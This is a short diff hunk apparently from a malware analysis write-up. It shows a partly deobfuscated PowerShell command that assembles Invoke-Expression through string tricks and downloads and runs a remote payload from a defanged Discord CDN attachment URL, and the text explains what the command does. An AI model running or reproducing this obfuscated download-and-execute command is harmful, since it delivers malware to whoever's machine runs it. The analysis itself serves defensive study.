@@ -87,7 +87,8 @@ Systsd88m.Nsd88t.Wsd88bClisd88nt).Doq82mtring(''hu8pvcdn.discordapp[.]com/attach
 
 Slightly deobfuscated:
 ```
-/c powershe ll/W 01 ='i'+''+'E'+'x';sal donke ;=donke(donke((new-object System.Net.WebClient).DownloadString('hu8pvcdn.discordapp[.]com/attachmi47nts/1015258281561821208/1036207817209692210/conmi47thangi47o[.]jpg'.Replace('u8pv','ttps://').Replace('i47', 'e'))));exit9%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
+/c powershe ll/W 01 ='i'+''+'E'+'x';sal donke ;=donke(donke((new-object System.Net.WebClient).DownloadString('hu8pvcdn.discordapp[.]com/attachmi47nts/1015258281561821208/1036207817209692210/conmi47thangi47o[.]jpg'.Replace('u8pv','ttps://').Replace('i47',
+'e'))));exit9%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
 ```
 We can see that PowerShell is being used to download and execute the remote payload: "hu8pvcdn.discordapp[.]com/attachmi47nts/1015258281561821208/1036207817209692210/conmi47thangi47o[.]jpg"
 
